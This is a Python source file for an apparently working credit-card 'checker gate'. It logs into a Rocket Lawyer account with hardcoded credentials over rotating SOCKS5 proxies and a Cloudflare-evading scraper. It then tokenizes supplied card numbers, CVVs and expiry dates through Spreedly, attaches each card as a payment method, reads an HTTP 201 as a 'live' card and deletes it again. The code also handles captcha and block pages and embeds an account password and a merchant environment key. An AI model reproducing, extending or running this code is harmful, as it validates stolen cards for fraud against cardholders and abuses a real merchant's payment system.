import cloudscraper
from time import sleep
from urllib.parse import quote
from random import randint
from dependencie.infobill import infobill

from model.models import gateData

class CoreGateCode:
    def __init__(self, cardID):
        self.cardID = cardID
        self.billx = infobill()
    def getStr(self,data,inicio,final):
        strx1 = data.split(inicio)
        strx2 = strx1[1].split(final)
        return strx2[0]
    def __valiDCardId(self,cc):
        if self.cardID == 'visa':
            self.cardID = '001'
        elif self.cardID == 'mc':
            self.cardID = '002'
        elif self.cardID == 'amex':
            self.cardID = '003'
        elif self.cardID == 'discovery':
            self.cardID = '004'
        
    def processCodeGate(self,cc,dataGate:gateData):
        #self.__valiDCardId(cc)
        cc1 = cc.ccnum[0:6]
        cc2 = cc.ccnum[12:16]
        


        proxies = {
            'http': f'socks5://{dataGate.proxy}',
            'https': f'socks5://{dataGate.proxy}'
        }
        timeout = 5
        
        cs = cloudscraper.create_scraper(
            browser={
                'browser': 'firefox',
                'platform': 'windows',
                'mobile': False
                
            },
            debug=False
            
        )

    #datext
        
        #cs.proxies.update(proxies)
        try:
            status = dict()
            email:str = ""
            statusregister:bool = True
            statusLive = False
           

            username = "axerlmilsd@gmail.com"
            passwoe = "Lord1928E"

            headers = {
                            'Host':'www.rocketlawyer.com',
                            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                            'Accept-Language':'en-US,en;q=0.5',
                            'Accept-Encoding':'gzip, deflate, br',
                            'DNT':'1',
                            'Connection':'keep-alive',
                            'Upgrade-Insecure-Requests':'1',
                            'Sec-Fetch-Dest':'document',
                            'Sec-Fetch-Mode':'navigate',
                            'Sec-Fetch-Site':'none',
                            'Sec-Fetch-User':'?1'
                            }



            datac = cs.get("https://www.rocketlawyer.com/login-register.rl#/login",headers=headers,proxies=proxies,timeout=timeout)



            headers = {
                            'Host':'www.rocketlawyer.com',
                            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                            'Accept-Language':'en-US,en;q=0.5',
                            'Accept-Encoding':'gzip, deflate, br',
                            'Content-Type':'application/json',
                            'Origin':'https://www.rocketlawyer.com',
                            'DNT':'1',
                            'Connection':'keep-alive',
                            'Referer':'https://www.rocketlawyer.com/login-register.rl',
                            'Sec-Fetch-Dest':'empty',
                            'Sec-Fetch-Mode':'cors',
                            'Sec-Fetch-Site':'same-origin'
                            }

            data = '{"username":"axerlmilsd@gmail.com","password":"Lord1928E","businessDocument":""}'
            datac = cs.post('https://www.rocketlawyer.com/identity/v1/auth/login',data=data,headers=headers,proxies=proxies,timeout=timeout)


            headers = {
                            'Host':'www.rocketlawyer.com',
                            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                            'Accept-Language':'en-US,en;q=0.5',
                            'Accept-Encoding':'gzip, deflate, br',
                            'DNT':'1',
                            'Connection':'keep-alive',
                            'Upgrade-Insecure-Requests':'1',
                            'Sec-Fetch-Dest':'document',
                            'Sec-Fetch-Mode':'navigate',
                            'Sec-Fetch-Site':'none',
                            'Sec-Fetch-User':'?1',
                            'TE':'trailers'
                            }

            datac = cs.post('https://www.rocketlawyer.com/app.rl/billing-details',headers=headers,proxies=proxies,timeout=timeout)




            headers = {
            'Host':'core.spreedly.com',
            'Accept':'*/*',
            'Accept-Language':'en-US,en;q=0.5',
            'Access-Control-Request-Method':'POST',
            'Access-Control-Request-Headers':'content-type',
            'Referer':'https://www.rocketlawyer.com/',
            'Origin':'https://www.rocketlawyer.com',
            'DNT':'1',
            'Connection':'keep-alive',
            'Sec-Fetch-Dest':'empty',
            'Sec-Fetch-Mode':'cors',
            'Sec-Fetch-Site':'cross-site'
            }

            datac = cs.options("https://core.spreedly.com/v1/payment_methods.json?environment_key=aDKgKRnWCWdjWQrezxLJjldX6Bj",headers=headers,proxies=proxies,timeout=timeout)




            headers = {
                            'Host':'core.spreedly.com',
                            'Accept':'application/json, text/plain, */*',
                            'Accept-Language':'en-US,en;q=0.5',
                            'Accept-Encoding':'gzip, deflate, br',
                            'Content-Type':'application/json',
                            'Origin':'https://www.rocketlawyer.com',
                            'DNT':'1',
                            'Connection':'keep-alive',
                            'Referer':'https://www.rocketlawyer.com/',
                            'Sec-Fetch-Dest':'empty',
                            'Sec-Fetch-Mode':'cors',
                            'Sec-Fetch-Site':'cross-site',
                            'TE':'trailers '  
                            }

            data ='{"payment_method":{"credit_card":{"kind":"credit_card","first_name":"azel","last_name":"walk","number":"'+cc.ccnum+'","verification_value":"'+cc.cv2+'","month":"'+cc.expm+'","year":'+cc.expy+',"email":"axerlmilsd@gmail.com","zip":"77007","retained":true}}}'

            datac = cs.post('https://core.spreedly.com/v1/payment_methods.json?environment_key=aDKgKRnWCWdjWQrezxLJjldX6Bj',headers=headers,data=data,proxies=proxies,timeout=timeout)

            datajson = datac.json()


            tokenx = datajson['transaction']['payment_method']['token']


            headers = {
                            'Host':'www.rocketlawyer.com',
                            'Accept':'application/json, text/plain, */*',
                            'Accept-Language':'en-US,en;q=0.5',
                            'Accept-Encoding':'gzip, deflate, br',
                            'Content-Type':'application/x-www-form-urlencoded;charset=utf-8',
                            'request-id':'true',
                            'Origin':'https://www.rocketlawyer.com',
                            'DNT':'1',
                            'Connection':'keep-alive',
                            'Referer':'https://www.rocketlawyer.com/app.rl/billing-details',
                            'Sec-Fetch-Dest':'empty',
                            'Sec-Fetch-Mode':'cors',
                            'Sec-Fetch-Site':'same-origin',
                            'TE':'trailers'
                            }

            data = "payment_method_type=CARD&user_email=axerlmilsd%40gmail.com&set_as_default=true&token="+tokenx+"&created_by="

            datac = cs.post("https://www.rocketlawyer.com/ecommerce-site/v1/account/payment_methods",headers=headers,data=data,proxies=proxies,timeout=10)
            if "captcha/captcha.js" in datac.text:
                statusregister =False
            sleep(randint(2, 5))
            if datac.status_code == 201:
                statusLive = True
                    

                header= {
                    'Host':'www.rocketlawyer.com',
                    'Accept':'application/json, text/plain, */*',
                    'Accept-Language':'en-US,en;q=0.5',
                    'Accept-Encoding':'gzip, deflate, br',
                    'DNT':'1',
                    'Connection':'keep-alive',
                    'Referer':'https://www.rocketlawyer.com/app.rl/billing-details',
                    'Sec-Fetch-Dest':'empty',
                    'Sec-Fetch-Mode':'cors',
                    'Sec-Fetch-Site':'same-origin',
                    'TE':'trailers'
                    }

                datac = cs.get('https://www.rocketlawyer.com/ecommerce-site/v1/account/payment_methods',headers=header,proxies=proxies,timeout=timeout)


                datajx = datac.json()

                paymentid = datajx[0]['rl_payment_method_id']




                header = {
                    'Host':'www.rocketlawyer.com',
                    'Accept':'application/json, text/plain, */*',
                    'Accept-Language':'en-US,en;q=0.5',
                    'Accept-Encoding':'gzip, deflate, br',
                    'Origin':'https://www.rocketlawyer.com',
                    'DNT':'1',
                    'Connection':'keep-alive',
                    'Referer':'https://www.rocketlawyer.com/apap.rl/billing-details',
                    'Sec-Fetch-Dest':'empty',
                    'Sec-Fetch-Mode':'cors',
                    'Sec-Fetch-Site':'same-origin',
                    'TE':'trailers'
                    }

                datac = cs.delete('https://www.rocketlawyer.com/ecommerce-site/v1/account/payment_methods/'+paymentid,headers=header,proxies=proxies,timeout=timeout)


            cs.close()
 
            if '{"cause":"GENERIC"}' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy,'datext':email}
            elif statusLive:
                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy,'datext':email}
            elif not statusregister:
                return {'msg':4,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy}
            elif 'sorry, but you have been blocked' in datac.text:
                return {'msg':4,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy}
            else:
                status = {'msg':3,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy,'datext':email}
                
            return status
        except Exception as e:
            print(e,'que paso')
            return {'msg':4,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy}